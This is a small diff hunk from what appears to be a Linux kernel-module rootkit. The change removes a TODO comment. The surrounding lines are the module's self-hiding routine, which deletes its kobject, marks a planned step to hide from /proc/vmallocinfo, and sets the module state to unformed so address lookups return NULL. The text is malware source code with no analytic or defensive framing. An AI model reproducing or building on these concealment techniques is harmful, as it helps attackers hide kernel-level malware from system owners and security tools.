@@ -29,7 +29,6 @@ static void hide_me(void)
     kobject_del(&THIS_MODULE->mkobj.kobj);
 
     //3. Hide from /proc/vmallocinfo
-    //TODO: do
 
     //4. This way __module_address should always return NULL instead of the actual address (set module state to loading)
     THIS_MODULE->state = MODULE_STATE_UNFORMED;
